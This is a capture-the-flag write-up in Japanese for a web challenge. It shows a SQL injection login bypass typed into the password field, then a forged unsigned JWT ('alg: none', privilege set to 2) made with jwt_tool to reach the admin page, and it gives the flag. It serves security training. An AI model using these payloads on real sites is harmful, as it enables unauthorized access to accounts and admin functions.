# Getting admin:Web:300pts
Challenge instance ready at 95.216.233.106:36245.  
See if you can get an admin account.  

# Solution
アクセスするとSign inとSign upがあるが、Sign upは現在停止しているようだ。  
RAQE  
[site.png](../Quarantine_-_Hidden_information/site/site.png)  
Sign inを試みる。  
Login  
[site1.png](../Quarantine/site/site1.png)  
Passwordに`'`を入力(Usernameは空)してみると、Internal Server Errorを引き起こせた。  
SQLインジェクションが行えそうだ。  
`t' OR 't' = 't`をPasswordに設定したところ以下のようにAttempting to login as more than one user!??と怒られた。  
Login(more than one user)  
[site2.png](../Quarantine/site/site2.png)  
userを制限してやれば良いため、`t' OR LENGTH(username) = 5 --`とする。  
ログイン成功したが、adminではないためAdminリンクには飛べない。  
Three videos avaliable  
[site3.png](../Quarantine/site/flag.png)  
ここでクッキーを見てみると以下のJWTが入っていた。  
```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogIkhhcnJ5IiwgInByaXZpbGVnZSI6IDF9.A7OHDo-b3PB5XONTRuTYq6jm2Ab8iaT353oc-VPPNMU
```
JWTだ。  
[JSON Web Tokens - jwt.io](https://jwt.io)で中身を見ると以下のようであった。  
HEADER:ALGORITHM & TOKEN TYPE  
```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```
PAYLOAD:DATA   
```json
{
  "user": "Harry",
  "privilege": 1
}
```
userをAdminとするかprivilegeを0か2にしてみれば良いようだが署名をどうにかする必要がある。  
[The JSON Web Token Toolkit](https://github.com/ticarpi/jwt_tool)を使ってnoneが通るか確認する。  
一部の出力は省略する。  
```bash
$ python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogIkhhcnJ5IiwgInByaXZpbGVnZSI6IDF9.A7OHDo-b3PB5XONTRuTYq6jm2Ab8iaT353oc-VPPNMU
> 2
~~~
"alg": "None":
eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJ1c2VyIjoiSGFycnkiLCJwcml2aWxlZ2UiOjF9.

"alg": "NONE":
eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.eyJ1c2VyIjoiSGFycnkiLCJwcml2aWxlZ2UiOjF9.

"alg": "nOnE":
eyJ0eXAiOiJKV1QiLCJhbGciOiJuT25FIn0.eyJ1c2VyIjoiSGFycnkiLCJwcml2aWxlZ2UiOjF9.
~~~
```
`eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJ1c2VyIjoiSGFycnkiLCJwcml2aWxlZ2UiOjF9.`をセットしても問題ないようだ。  
よってJWTを任意のものに改竄し、署名無しにすればよい。  
一部の出力は省略する。  
```bash
$ python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogIkhhcnJ5IiwgInByaXZpbGVnZSI6IDF9.A7OHDo-b3PB5XONTRuTYq6jm2Ab8iaT353oc-VPPNMU
> 1
> 2
> none
> 0
> 2
> 2
[1] user = "Harry"
[2] privilege = 2
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step
>0
> 3
~~~
Your new forged token:
"alg": "none":
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiSGFycnkiLCJwcml2aWxlZ2UiOjJ9.

====================================================================
Some variants, which may work on some JWT libraries:

"alg": "None":
eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJ1c2VyIjoiSGFycnkiLCJwcml2aWxlZ2UiOjJ9.

"alg": "NONE":
eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.eyJ1c2VyIjoiSGFycnkiLCJwcml2aWxlZ2UiOjJ9.

"alg": "nOnE":
eyJ0eXAiOiJKV1QiLCJhbGciOiJuT25FIn0.eyJ1c2VyIjoiSGFycnkiLCJwcml2aWxlZ2UiOjJ9.
====================================================================
```
結局privilegeを2とするのが正解だった。  
`eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiSGFycnkiLCJwcml2aWxlZ2UiOjJ9.`をセットしてAdminに飛ぶとflagが得られる。  

## ractf{j4va5cr1pt_w3b_t0ken}